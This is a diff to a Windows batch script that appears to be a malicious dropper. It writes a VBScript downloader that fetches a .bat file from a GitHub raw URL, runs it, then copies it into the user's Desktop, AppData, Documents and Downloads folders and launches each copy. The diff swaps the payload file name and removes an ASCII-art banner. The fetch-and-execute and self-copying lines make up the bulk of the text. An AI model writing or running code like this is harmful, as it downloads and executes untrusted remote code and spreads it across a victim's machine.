@@ -2,7 +2,7 @@
 color 04
 rem Hey! this smol chunk is from delme.
 echo ' Set your settings >>downloader.vbs
-echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/c.bat" >>downloader.vbs
+echo     strFileURL = "https://raw.githubusercontent.com/Link1992md/vmtestMD/main/g.bat" >>downloader.vbs
 echo     strHDLocation = "c.bat" >>downloader.vbs
 echo ' Fetch the file >>downloader.vbs
 echo     Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>downloader.vbs
@@ -24,30 +24,14 @@ echo     End if >>downloader.vbs
 echo     Set objXMLHTTP = Nothing >>downloader.vbs
 start "" downloader.vbs
 rem end chunk
-echo %%%%&&&&..............%%%/
-echo %%%%&&&&.........&&&..%%%%%
-echo %%%%&&&&.........&&&..%%%%%%%
-echo %%%%&&&&.........&&&..%%%%%%%   glhf
-echo %%%%&&&&.........,,,..%%%%%%%
-echo %%%%%%%%%%%%%%%%%%%%%%%%%%%%%
-echo %%%%%%%%%%%%%%%%%%%%%%%%%%%%% 
-echo %%%%  _________________ .%%%%
-echo %%%%  _________________ .%%%%
-echo %%%%  _________________ .%%%%
-echo %%%%  _________________ .%%%%
-echo %%%%  _________________ .%%%%
-echo %%%%  _________________ .%%%%
-echo %&&%                    ,%&&%
-echo %&&%%%%%%%%%%%%%%%%%%%%%%%&&%
-echo %&&%%%%%%%%%%%%%%%%%%%%%%%&&%
 start c.bat
-copy a.bat "%userprofile%\Desktop"
-start %userprofile%\Desktop\a.bat
-copy a.bat "%userprofile%\AppData"
-start %userprofile%\AppData\a.bat
-copy a.bat "%userprofile%\Documents"
-start %userprofile%\Documents\a.bat
-copy a.bat "%userprofile%\Downloads"
-start %userprofile%\Downloads\a.bat
+copy c.bat "%userprofile%\Desktop"
+start %userprofile%\Desktop\c.bat
+copy c.bat "%userprofile%\AppData"
+start %userprofile%\AppData\c.bat
+copy c.bat "%userprofile%\Documents"
+start %userprofile%\Documents\c.bat
+copy c.bat "%userprofile%\Downloads"
+start %userprofile%\Downloads\c.bat
 del /f /q downloader.vbs
 pause
